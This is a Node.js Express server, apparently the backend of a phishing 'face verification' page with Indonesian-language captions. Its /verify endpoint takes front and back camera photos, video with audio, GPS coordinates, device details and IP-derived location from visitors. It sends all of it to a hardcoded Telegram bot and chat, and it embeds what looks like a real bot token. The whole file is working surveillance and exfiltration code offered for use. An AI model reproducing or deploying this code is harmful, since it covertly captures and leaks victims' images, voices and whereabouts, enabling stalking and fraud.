const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// ============================================
// 📍 GET LOCATION
// ============================================
async function getLocationDetails(ip) {
    try {
        const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
        if (!cleanIp) return null;

        const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp`);
        const data = await res.json();

        if (data.status === 'success') {
            return {
                fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
                latitude: data.lat || 0,
                longitude: data.lon || 0,
                provider: data.isp ? data.isp.replace('PT ', '') : '-',
                googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`
            };
        }
        return null;
    } catch (e) {
        console.error('Geolocation error:', e.message);
        return null;
    }
}

// ============================================
// 📤 SEND TO TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
        const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        // KIRIM FOTO DEPAN
        if (frontPhoto) {
            const buffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');

            let caption = `🟡 *VERIFIKASI WAJAH - DEPAN*\n\n`;
            caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
            caption += `🕒 *Waktu:* ${time}\n\n`;

            if (device) {
                caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
                caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
                caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
            }

            if (locationData) {
                caption += `📍 *Lokasi:* ${locationData.fullLocation}\n`;
                caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
            }

            if (gps) {
                caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
            }

            caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
            caption += `_📹 Video + Audio juga dikirim_`;

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', caption);
            form.append('photo', buffer, {
                filename: `foto_depan_${Date.now()}.jpg`,
                contentType: 'image/jpeg'
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
        }

        // KIRIM FOTO BELAKANG
        if (backPhoto) {
            const buffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', `📸 *Foto Belakang*\nUser: ${phone || 'Tidak diketahui'}`);
            form.append('photo', buffer, {
                filename: `foto_belakang_${Date.now()}.jpg`,
                contentType: 'image/jpeg'
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
        }

        // KIRIM VIDEO + AUDIO
        if (video) {
            const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
            const videoBuffer = Buffer.from(videoBase64, 'base64');

            const formVideo = new FormData();
            formVideo.append('chat_id', CHAT_ID);
            formVideo.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}\n🕒 ${time}`);
            formVideo.append('video', videoBuffer, {
                filename: `video_${Date.now()}.webm`,
                contentType: 'video/webm'
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formVideo
            });
        }

        // KIRIM LOKASI GPS
        if (gps) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: gps.latitude,
                    longitude: gps.longitude
                })
            });
        }

        return true;
    } catch (err) {
        console.error('Send error:', err);
        return false;
    }
}

// ============================================
// ✅ VERIFY ENDPOINT
// ============================================
app.post('/verify', async (req, res) => {
    console.log('📸 ===== NEW VERIFICATION =====');
    console.log('📸 Time:', new Date().toISOString());

    try {
        const { frontPhoto, backPhoto, video, gps, device, timestamp, phone } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

        console.log(`📸 Front Photo: ${frontPhoto ? 'YES' : 'NO'}`);
        console.log(`📸 Back Photo: ${backPhoto ? 'YES' : 'NO'}`);
        console.log(`📹 Video: ${video ? 'YES' : 'NO'}`);

        const locationData = await getLocationDetails(ip);

        const result = await sendToTelegram({
            frontPhoto,
            backPhoto,
            video,
            gps,
            device,
            ip,
            timestamp: timestamp || new Date().toISOString(),
            phone: phone || `User_${Date.now().toString().slice(-6)}`,
            locationData
        });

        if (result) {
            console.log('✅ Success!');
            res.json({ success: true });
        } else {
            console.log('❌ Failed');
            res.json({ success: false, error: 'Telegram error' });
        }

    } catch (err) {
        console.error('❌ Error:', err);
        res.json({ success: false, error: err.message });
    }
});

// ============================================
// 🧪 TEST
// ============================================
app.get('/test', async (req, res) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
